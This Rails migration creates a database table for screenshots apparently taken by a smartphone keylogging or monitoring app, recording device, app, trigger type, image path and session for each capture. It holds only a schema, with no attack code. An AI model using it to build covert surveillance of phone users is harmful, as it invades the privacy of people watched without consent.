class CreateKeylogScreenshots < ActiveRecord::Migration[6.0]
  def change
    create_table :keylog_screenshots do |t|
      t.references :smartphone, null: false, foreign_key: true
      t.string :device_id
      t.bigint :client_timestamp
      t.string :app_package
      t.string :app_name
      t.string :trigger_type
      t.string :image_path
      t.integer :width
      t.integer :height
      t.integer :file_size
      t.string :session_id

      t.timestamps
    end

    add_index :keylog_screenshots, :device_id
    add_index :keylog_screenshots, :client_timestamp
    add_index :keylog_screenshots, :trigger_type
  end
end
